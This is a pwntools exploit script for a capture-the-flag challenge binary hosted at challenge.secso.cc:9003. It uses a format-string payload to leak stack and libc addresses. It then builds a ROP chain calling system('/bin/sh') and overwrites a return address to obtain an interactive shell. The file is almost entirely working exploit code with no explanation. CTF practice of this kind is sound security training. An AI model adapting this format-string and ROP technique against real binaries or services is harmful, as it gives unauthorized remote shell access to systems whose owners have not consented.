from pwn import *             
import re

context.log_level = 'warning' 


context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 


HOST="nc challenge.secso.cc 9003"
ADDRESS,PORT=HOST.split()[1:]

BINARY_NAME="./chal"
binary = context.binary = ELF(BINARY_NAME, checksec=False)
libc  = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    

payload=b'%20$p %21$p' #stack, libc


# 0x7ffd14560fd8 —▸ 0x401384 (main+297) -> 0x40137a 
# Well hello 0x75ad6562a1ca 0x7ffd14561018
p.sendlineafter(b'Please state your name:',payload)
p.recvline()
response = p.recvline().decode()


matches = re.findall(r'0x[0-9a-fA-F]+', response)
if len(matches) >= 2:
    stack_leak = int(matches[0], 16)-0x40-0xd8
    libc_leak = int(matches[1], 16)-0x2a1ca
    
    log.warn(f"stack_leak_ret: {hex(stack_leak)}")
    log.warn(f"libc_leak_start: {hex(libc_leak)}")
else:
    log.warn("Could not find both leaks in response.")


libc.address=libc_leak

bin_sh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" string in libc
system = libc.sym['system']             # Find system() function address

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Find "pop rdi; ret" gadget

warn(f"pop rdi; ret: {pop_rdi:#x}")
warn(f"/bin/sh: {bin_sh:#x}")
warn(f"system: {system:#x}")

ropchain = b''.join([p64(pop_rdi), p64(bin_sh), p64(system)])
p.sendlineafter(b'Please state a fun fact about yourself:', ropchain)
p.sendlineafter(b'Now let\'s get to business. Where would you like to place your hole?', hex(stack_leak).encode())
p.sendlineafter(b'What would you like to write there?',b'138') #138 (0x8a) (ret) #ret=0x40138a
#p.sendlineafter(b'What would you like to write there?',b'132') #138 (0x8a) (ret) #ret=0x40138a


p.interactive()
